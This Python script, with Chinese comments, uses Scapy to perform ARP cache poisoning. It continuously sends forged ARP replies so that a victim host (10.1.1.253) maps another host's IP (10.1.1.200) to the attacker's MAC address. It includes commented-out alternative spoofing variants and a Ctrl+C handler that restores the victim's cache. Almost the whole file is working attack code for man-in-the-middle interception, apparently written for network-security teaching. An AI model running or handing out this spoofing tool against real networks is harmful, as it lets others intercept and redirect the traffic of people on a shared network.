#!/usr/bin/env python3
# -*- coding=utf-8 -*-


import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错
from scapy.all import *
from Tools.GET_IP_netifaces import get_ip_address  # 导入获取本机IP地址方法
from Tools.GET_MAC_netifaces import get_mac_address  # 导入获取本机MAC地址方法
from ARP_Request import arp_request  # 导入之前创建的ARP请求脚本
import time
import signal


def arp_spoof(ip_1, ip_2, ifname='Net1'):
    global localip, localmac, ip_1_mac, ip_2_mac, g_ip_1, g_ip_2, g_ifname  # 申明全局变量
    g_ip_1 = ip_1  # 为全局变量赋值，g_ip_1为被毒化ARP设备的IP地址
    g_ip_2 = ip_2  # 为全局变量赋值，g_ip_2为本机伪装设备的IP地址
    g_ifname = ifname  # 为全局变量赋值，攻击使用的接口名字

    # 获取本机IP地址，并且赋值到全局变量localip
    localip = get_ip_address(ifname)
    # 获取本机MAC地址，并且赋值到全局变量localmac
    localmac = get_mac_address(ifname)
    # 获取ip_1的真实MAC地址
    ip_1_mac = arp_request(ip_1,ifname)[1]
    # 获取ip_2的真实MAC地址
    ip_2_mac = arp_request(ip_2,ifname)[1]
    # 引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
    signal.signal(signal.SIGINT, sigint_handler)
    while True:  # 一直攻击，直到ctl+c出现！！！
        # op=2,响应ARP
        sendp(Ether(src=localmac, dst=ip_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
              #iface=g_ifname, # windows 环境需要去掉
              verbose=False)
        # op=1,请求ARP
        # sendp(Ether(src=localmac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1), iface = g_ifname, verbose = False)
        # 以太网头部的src MAC地址与ARP数据部分的hwsrc MAC不匹配攻击效果相同
        # sendp(Ether(src=ip_1_mac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1), iface = g_ifname, verbose = False)
        # 如果采用dst为二层广播，会造成被伪装设备告警地址重叠，并且欺骗效果不稳定，容易抖动！
        print("发送ARP欺骗数据包！欺骗" + ip_1 + ',本机MAC地址为' + ip_2 + '的MAC地址！！！')
        time.sleep(1)


def sigint_handler(signum, frame):  # 定义处理方法
    global localip, localmac, ip_1_mac, ip_2_mac, g_ip_1, g_ip_2, g_ifname  # 引入全局变量
    print("\n执行恢复操作！！！")
    # 发送ARP数据包，恢复被毒化设备的ARP缓存
    sendp(Ether(src=ip_2_mac, dst=ip_1_mac) / ARP(op=2, hwsrc=ip_2_mac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
          # iface=g_ifname, # windows 环境需要去掉
          verbose=False)
    print("已经恢复 " + g_ip_1 + " ARP缓存")
    # 退出程序，跳出while True
    sys.exit()


if __name__ == "__main__":
    # Windows Linux均可使用
    arp_spoof('10.1.1.253', '10.1.1.200', 'Net1') # 欺骗10.1.1.253 让它认为10.1.1.200的MAC地址为本地攻击者计算机的MAC
    # from optparse import OptionParser
    # usage = "usage: ./scapy_arp_spoof 被欺骗主机IP 伪装主机的IP -i interface"
    # version = "version 1.0"
    # parser = OptionParser(usage=usage,version=version)
    # parser.add_option("-i", "--interface", dest="iface",help="Specify an interface", default='ens33', type="string")
    # (options, args) = parser.parse_args()
    #
    # try:
    #     arp_spoof(args[0], args[1], options.iface)
    # except IndexError:
    #     print(usage)
